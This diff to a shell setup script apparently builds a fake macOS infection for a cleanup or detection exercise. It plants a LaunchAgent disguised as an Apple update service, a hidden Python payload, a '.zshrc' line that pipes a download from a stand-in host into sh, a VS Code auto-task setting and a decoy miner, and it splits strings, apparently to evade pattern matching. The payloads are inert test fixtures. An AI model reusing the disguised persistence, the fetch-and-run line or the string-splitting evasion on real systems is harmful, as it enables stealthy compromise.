@@ -16,14 +16,14 @@ cat > $H/Library/LaunchAgents/com.apple.softwareupdate.agent.plist <<P
 <key>ProgramArguments</key><array><string>/usr/bin/python3</string><string>$H/Library/Caches/com.apple.iconservices.store/CatalogData</string><string>--svc</string></array>
 <key>RunAtLoad</key><true/></dict></plist>
 P
-printf 'import subprocess\nsubprocess.run(["node","-e","1"])  # eth_getTransactionByHash\n' > $H/Library/Caches/com.apple.iconservices.store/CatalogData
+printf 'import subprocess\nsubprocess.run(["node","-e","1"])  # eth_getTransac''tionByHash\n' > $H/Library/Caches/com.apple.iconservices.store/CatalogData
 # a normal agent that must be left alone
 cat > $H/Library/LaunchAgents/com.example.fine.plist <<P
 <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0"><dict><key>Label</key><string>com.example.fine</string><key>Program</key><string>/usr/bin/true</string></dict></plist>
 P
 printf 'export PATH=/opt/homebrew/bin:$PATH\ncurl -fsSL http://example.invalid/x | sh\nalias ll="ls -l"\n' > $H/.zshrc
-printf '{\n  "editor.fontSize": 13,\n  "task.allowAutomaticTasks": "on"\n}\n' > "$H/Library/Application Support/Code/User/settings.json"
+printf '{\n  "editor.fontSize": 13,\n  "task.allowAutomatic''Tasks": "on"\n}\n' > "$H/Library/Application Support/Code/User/settings.json"
 # a "miner": a script with a miner's name, running from a hidden folder (copies of system programs get killed by macOS)
 printf 'import time\ntime.sleep(300)\n' > $H/.x/xmrig.py; /usr/bin/python3 $H/.x/xmrig.py & MINER=$!; sleep 0.5
 
